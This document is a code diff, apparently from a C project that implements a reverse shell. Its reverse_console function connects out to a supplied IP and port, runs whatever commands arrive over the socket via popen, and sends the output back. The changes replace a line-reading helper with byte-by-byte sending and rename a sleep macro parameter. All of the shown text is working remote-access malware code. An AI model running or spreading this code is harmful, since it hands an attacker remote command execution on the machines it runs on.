@@ -12,7 +12,7 @@
   #define popen _popen
   #define pclose _pclose
   #define close closesocket
-  #define sleep(S) Sleep(S * 1000)
+  #define sleep(seconds) Sleep(seconds * 1000)
   #pragma comment(lib, "ws2_32.lib")
   #pragma comment(lib, "user32.lib")
 #else
@@ -24,20 +24,6 @@
 typedef struct sockaddr sockaddr;
 typedef struct sockaddr_in sockaddr_in;
 
-int readline(char*buffer, int buffsize, FILE* fd) {
-  int count=0;
-  char *ptr=buffer;
-  while (count != buffsize) {
-    if (fread(ptr, 1, 1, fd) != 1)
-      break;
-    count++;
-    if (*ptr == '\n')
-      break;
-    ptr++;
-  }
-  *(ptr+1) = 0;
-  return count;
-}
 
 void reverse_console(char* ip, short port) {
   FILE* pipe;
@@ -60,13 +46,10 @@ void reverse_console(char* ip, short port) {
         memset(buffer, 0, sizeof(buffer));
         if ((bytes_recv = recv(sockfd, buffer, sizeof(buffer), 0)) > 0) {
           if ((pipe = (FILE*)popen(buffer, "r")) != NULL) {
-            while (!feof(pipe)) {
-              bytes_read = readline(buffer, sizeof(buffer), pipe);
-              if (bytes_read > 0) {
-                if (send(sockfd, buffer, bytes_read, 0) <= 0)
-                  break;
-              }
-            }
+            // send output
+            while (!feof(pipe) && fread(buffer, 1, 1, pipe) == 1)
+              if (send(sockfd, buffer, 1, 0) != 1)
+                break;
             pclose(pipe);
             if(send(sockfd, "\x00\x00", 2, 0) <= 0)
               break;
